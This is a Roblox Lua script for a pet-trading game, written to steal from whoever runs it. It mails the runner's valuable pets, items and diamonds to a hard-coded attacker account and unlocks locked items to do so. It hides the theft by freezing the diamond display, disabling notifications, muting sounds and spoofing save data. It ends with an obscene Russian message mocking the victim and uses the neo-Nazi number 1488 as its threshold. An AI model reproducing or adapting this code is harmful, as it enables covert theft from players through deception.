Username = "woodalaz" --хихихихиххихихихихихихихихихи
MinRap = 1488
MailMessage = "jffjjffjfj"
min_rap = 1488

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local mailsent = library.Save.Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local sortedItems = {}
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
	return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
	return
end
_G.scriptExecuted = true

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
	if v.id == "Diamonds" then
		GemAmount1 = v._am
		break
	end
end

if newamount > GemAmount1 then
	return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local user = Username
local user2 = Username

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
	if x.ClassName == "Sound" then
		if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
			x.Volume=0
			x.PlayOnRemove=false
			x:Destroy()
		end
	end
end)

local function getRAP(Type, Item)
	return (library.DevRAPCmds.Get(
		{
			Class = {Name = Type},
			IsA = function(hmm)
				return hmm == Type
			end,
			GetId = function()
				return Item.id
			end,
			StackKey = function()
				return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
			end
		}
		) or 0)
end

local function sendItem(category, uid, am)
	local args = {
		[1] = user,
		[2] = MailMessage,
		[3] = category,
		[4] = uid,
		[5] = am or 1
	}
	local response = false
	repeat
		local response, err = network:WaitForChild("QR_Dispatch"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = math.ceil(math.ceil(newamount) * 1.5)
	if newamount > 5000000 then
		newamount = 5000000
	end
end

local function SendAllGems()
	for i, v in pairs(GetSave().Inventory.Currency) do
		if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
		end
	end
end

local function EmptyBoxes()
	if save.Box then
		for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
		end
	end
end

local function ClaimMail()
	local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
	while err == "You must wait 30 seconds before using the mailbox!" do
		wait()
		response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
	end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	pcall(function()
		if save[v] ~= nil then
			for uid, item in pairs(save[v]) do
				if v == "Pet" then
					local dir = library.Directory.Pets[item.id]
					if dir.huge or dir.exclusiveLevel then
						local rapValue = getRAP(v, item)
						if rapValue >= min_rap then
							local prefix = ""
							if item.pt and item.pt == 1 then
								prefix = "Golden "
							elseif item.pt and item.pt == 2 then
								prefix = "Rainbow "
							end
							if item.sh then
								prefix = "Shiny " .. prefix
							end
							local id = prefix .. item.id
							table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
						end
					end
				else
					local rapValue = getRAP(v, item)
					if rapValue >= min_rap then
						table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
					end
				end
				if item._lk then
					local args = {
						[1] = uid,
						[2] = false
					}
					network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
				end
			end
		end
	end)    
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
	pcall(function()
		ClaimMail()
		EmptyBoxes()
		require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
		require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
	end)   
	
	local blob_a = require(game.ReplicatedStorage.Library)
	local blob_b = blob_a.Save.Get()
	function deepCopy(original)
		local copy = {}
		for k, v in pairs(original) do
			if type(v) == "table" then
				v = deepCopy(v)
			end
			copy[k] = v
		end
		return copy
	end

	blob_b = deepCopy(blob_b)
	blob_a.Save.Get = function(...)
		return blob_b
	end


	pcall(function()
		table.sort(sortedItems, function(a, b)
			return a.rap * a.amount > b.rap * b.amount 
		end)
	end)    



	pcall(function()
		for _, item in ipairs(sortedItems) do
			if item.rap >= newamount then
				sendItem(item.category, item.uid, item.amount)
			else
				break
			end
		end
		SendAllGems()
	end)

	local message = require(game.ReplicatedStorage.Library.Client.Message)
	message.Error("ЕБАТЬ ТЫ ЛОХ АХАХАХАХХАХАХААХХАХАХАХАХ")
end